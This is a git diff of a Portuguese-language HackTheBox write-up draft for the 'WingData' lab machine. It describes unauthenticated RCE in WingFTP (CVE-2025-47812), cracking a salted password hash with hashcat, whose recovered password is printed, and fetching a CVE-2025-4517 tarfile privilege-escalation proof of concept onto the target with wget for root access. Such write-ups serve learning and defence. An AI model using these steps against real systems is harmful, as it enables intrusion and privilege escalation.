@@ -2,22 +2,34 @@
 title: WingData HTB Write-up
 created: 2026-04-01 22:26
 tags:
+  - ctf
+  - hackthebox
+  - walkthrough
+  - pathtraversal
+  - rce
+  - CVE-2025-47812
+  - CVE-2025-4517
 draft: true
 ---
 
-# Subtítulo da horinha
+# Do RCE Não Autenticado ao Root via Python Tarfile Bypass (CVE-2025-4517)
 
 ![[WingData.png | Wingdata logo]]
 
 ## Introdução
 
-introdução e resumo aqui
+Olá mundo! Sejam bem-vindos à mais uma aventura hackthebox.
 
+`WingData` é uma máquina classificada como de dificuldade fácil. Nela encontramos um servidor [[FTP]] `WingFTP` vulnerável à `CVE-2025-47812 WingFTP Server 7.4.3 - Unauthenticated Remote Code Execution`. Depois de conseguir um **backdoor** no servidor, encontramos nos arquivos de configuração do `WingFTP` a hash de senha do usuário `wacky`,. Após fazer a quebra de senha obtemos acesso ao servidor via [[SSH]] como usuário legítimo. Por fim exploramos a `CVE-2025-4517 Tarfile Exploit Privilege Escalation via Symlink + Hardlink Bypass` que abusa de uma falha no **Python** desatualizado juntamente com uma permissão `sudo` excessiva.
+
+Estou ansioso para contar como foi, então vamos nessa!
+
+--- 
 ## Reconhecimento
 
 ### Nmap Scan
 
-O scan do NMAP retornou as portas 22 e 80 como abertas.
+O scan do [[NMAP]] retornou as portas **22** e **80** como abertas.
 
 Comando do `Nmap`:
 
@@ -142,7 +154,7 @@ Procurando nos diretórios do `WingFTP`, encontrei dois arquivos interessantes:
 * O segundo é o `settings.xml`, que foi encontrado no diretório anterior ao primeiro arquivo encontrado.
 Esses arquivos são interessantes porque foi onde encontrei um **hash de senha** e o **Salt**. O hash estava encriptado em `SHA-256`.
 
-Infelizmente não consegui quebrar com minha vm usando o `john the ripper`. No entanto foi possível quebrar usando o `Hashcat` na máquina host.
+Infelizmente não consegui quebrar com minha **VM** usando o `john the ripper`. No entanto foi possível quebrar usando o `Hashcat` na máquina host.
 
 ```bash {3}
 hashcat.exe -m 1410 hash rockyou.txt
@@ -150,7 +162,7 @@ hashcat.exe -m 1410 hash rockyou.txt
 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5 
 ```
 
-Com a senha em mãos eu só precisava de um usuário. Então usei o comando `cat /etc/passwd | grep sh$` para retornar todos os usuários que possuem um shell **bash**.
+Com a senha em mãos eu só precisava confirmar se  `wacky` era um usuário válido do servidor. Então usei o comando `cat /etc/passwd | grep sh$` para retornar todos os usuários que possuem um shell **bash**.
 
 ```bash {3}
 root:x:0:0:root:/root:/bin/bash
@@ -256,7 +268,7 @@ CVE-2025-4517-POC.py 100%[====================>]   6.81K  --.-KB/s    in 0s
 
 E transferí para o servidor alvo.
 
-```bash
+```bash title:"kali machine"
 ┌──(kali㉿kali)-[~/…/Hackthebox/Easy/WingData/tools]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -265,7 +277,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 Keyboard interrupt received, exiting.
 ```
 
-```bash
+```bash title:"ubuntu server"
 wacky@wingdata:/tmp$ wget http://10.10.15.250/CVE-2025-4517-POC.py
 --2026-03-29 22:57:44--  http://10.10.15.250/CVE-2025-4517-POC.py
 Connecting to 10.10.15.250:80... connected.
@@ -344,14 +356,12 @@ Em caso de vazamentos de dados sensíveis, uma organização nessa situação po
 Segue abaixo o fluxo de ataque dessa máquina:
 
 ```mermaid
-flowchart TD
+flowchart LR
 	subgraph acesso inicial
-    A(acesso inicial) -->|CVE-2025-xxxx| B(www-data) 
-    B -->|db.php| C(user1)
+    A(WingFTP login page) -->|CVE-2025-47812| B(WingFTP user) 
     end
     subgraph escalação de privilegios
-    C -->|exploit.sh| D(root)
-    C -->|portforward| E[web as root]
-    E -->|command execution| D(root)
+    B -->|wacky creds| C(wacky user)
+    C -->|CVE-2025-4517| D(root user)
     end
 ```
